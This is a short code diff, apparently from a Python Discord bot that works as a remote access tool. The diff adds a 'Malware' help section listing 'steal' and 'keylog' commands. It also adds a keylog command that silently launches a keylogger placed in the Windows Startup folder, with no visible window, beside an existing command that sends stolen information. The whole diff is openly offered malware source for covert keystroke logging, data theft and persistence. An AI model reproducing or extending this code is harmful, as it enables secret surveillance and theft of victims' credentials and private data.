@@ -21,6 +21,10 @@ except ImportError as e:
     globals()[missing_module] = __import__(missing_module)
 
 help_text = {
+    "Malware": (
+        "- ``steal` - Start the stealer.\n"
+        "- ``keylog` - Start the keylogger.\n"
+    ),
     "FileManagement": (
         "- `!current_dir` - Displays your current directory.\n"
         "- `!delete_file <file_name>` - Deletes a specified file from the current directory.\n"
@@ -330,6 +334,17 @@ async def steal(ctx):
         await ctx.send("Stealed info should be send in a bit.")
     except Exception as e:
         await error_message(ctx, e, "!steal")
+
+@client.command()
+@commands.cooldown(1, 5, commands.BucketType.category)
+async def keylog(ctx):
+    try:
+        pyw_file_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.pyw"
+        Popen(['pythonw.exe', pyw_file_path], creationflags=CREATE_NO_WINDOW)
+        await ctx.send("Keylogger should be starting in a bit.")
+    except Exception as e:
+        await error_message(ctx, e, "!steal")
+    
 
 @client.command()
 @commands.cooldown(1, 5, commands.BucketType.category)
